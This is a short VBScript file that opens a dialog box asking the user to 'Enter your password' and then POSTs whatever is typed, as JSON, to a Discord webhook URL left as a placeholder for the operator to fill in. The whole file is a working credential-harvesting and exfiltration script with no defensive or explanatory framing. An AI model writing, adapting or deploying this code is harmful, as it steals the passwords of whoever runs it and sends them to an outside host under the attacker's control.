Dim userInput
Dim webhookUrl
webhookUrl = "PUT HERE YOUR DISCORD WEBHOOK"  ' Replace this with your actual webhook URL

' Enable error handling
On Error Resume Next

' Prompt the user to input text in a dialog box
userInput = InputBox("Enter your password:", "Input Message")

' If the user has entered any data
If userInput <> "" Then
    ' Send the message to the Discord Webhook
    SendDiscordMessage userInput
Else
    MsgBox "No message to send!"
End If

' Function to send the message to the webhook
Sub SendDiscordMessage(message)
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "POST", webhookUrl, False
    objHTTP.setRequestHeader "Content-Type", "application/json"
    
    ' Create JSON payload
    Dim payload
    payload = "{""content"": """ & message & """}"
    
    objHTTP.Send payload
    
    ' Error handling - check only for critical errors
    If Err.Number <> 0 Then
        MsgBox "An error occurred while sending the message. Error code: " & Err.Number
        Err.Clear
    ElseIf objHTTP.Status = 204 Then
        MsgBox "Message sent successfully!"
    Else
        MsgBox "Failed to send the message. Status code: " & objHTTP.Status
    End If
End Sub

' Disable error handling
On Error GoTo 0
